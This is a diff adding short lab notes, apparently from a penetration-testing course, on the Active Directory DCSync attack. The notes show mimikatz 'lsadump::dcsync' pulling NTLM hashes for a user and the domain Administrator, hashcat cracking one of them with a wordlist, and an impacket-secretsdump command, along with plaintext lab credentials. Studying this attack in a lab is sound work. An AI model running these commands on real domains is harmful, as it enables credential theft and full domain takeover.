@@ -1,0 +1,29 @@
+Domain Controller Synchronization
+   
+To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
+
+CLIENT75 as jeffadmin with the password BrouhahaTungPerorateBroom2023!
+
+\mimikatz.exe
+
+#we target dave so we start with it
+lsadump::dcsync /user:corp\dave
+dave:08d7a47a6f9f66b97b1bae4178747494
+
+Nice! Mimikatz performed the dcsync attack by impersonating a domain controller and obtained the user credentials of dave by using replication.
+
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+08d7a47a6f9f66b97b1bae4178747494:Flowers1 
+
+
+Notably, we can perform the dcsync attack to obtain any user password hash in the domain, even the domain administrator Administrator.
+
+lsadump::dcsync /user:corp\Administrator
+2892d26cdf84d7a70e2eb3b9f05c425e
+
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.219.70
+
+
+
+
+
